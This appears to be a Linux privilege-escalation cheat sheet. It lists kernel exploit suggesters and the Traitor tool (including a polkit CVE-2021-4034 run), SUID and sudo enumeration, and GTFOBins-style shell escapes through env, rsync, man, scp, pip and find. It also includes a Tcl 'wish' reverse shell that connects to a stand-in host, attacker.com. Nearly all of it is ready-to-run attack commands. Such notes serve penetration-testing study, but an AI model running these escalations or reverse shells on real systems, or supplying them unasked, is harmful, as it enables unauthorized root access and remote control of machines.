# Linux Privilege Escalation

## kernel Exploit

#### Automate kernel Exploit finding

https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
https://github.com/jondonas/linux-exploit-suggester-2

```bash
./linux-exploit-suggester.sh
```

`Traitor`
Automatically exploit low-hanging fruit to pop a root shell. Linux privilege escalation made easy! Traitor packages up a bunch of methods to exploit local misconfigurations and vulnerabilities (including most of GTFOBins) in order to pop a root shell.

https://github.com/liamg/traitor

https://github.com/liamg/traitor/releases

```bash
./traitor 
```

```bash
./traitor -e polkit:CVE-2021-4034
```

## SUID Binary

A SUID is a special permission that certain executable files may have. When a file has the SUID bit set, users can execute it with the same permissions as its owner.

search for SUID Permission

```bash
find / -type f -perm -u=s 2>/dev/null
```

Exploit SUID

```
python2.7 -c 'import os; os.system("/bin/sh")'
```

## Sudo and sudo caching

check for sudo user 

```
sudo -l 
```

```
cat /etc/sudoers
```

## 

### Linux Automated Privilege Escalation

`GTFOBins` is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

https://github.com/GTFOBins

git clone https://github.com/t0thkr1s/gtfo

https://github.com/topics/gtfobins

`GTFONow` Automatic privilege escalation for misconfigured capabilities, sudo and suid binaries.

https://github.com/Frissi0n/GTFONow

#### Features

* Automatically escalate privileges using misconfigured sudo permissions.
* Automatically escalate privileges using misconfigured suid permissions.
* Automatically escalated privileges using misconfigured capabilities.

Usage

```bash
python3 gtfonow.py
```

```bash
python3 gtfonow.py 
```

### Capability Escalation

```bash
python3 gtfonow.py --caps
```

`pspy`  unprivileged Linux process snooping
pspy - is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute

https://github.com/DominicBreuker/pspy
https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

Bypass Restricted Environment

### Env

```bash
env /bin/sh  
```

### Rsync

```bash
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

### man

```bash
sudo man man
!/bin/bash
```

### man PE

```bash
sudo man git help config
!/bin/bash
```

### wish

```bash
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
```

### SCP

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
```

```bash
sudo find . -exec /bin/sh \; -quit
```
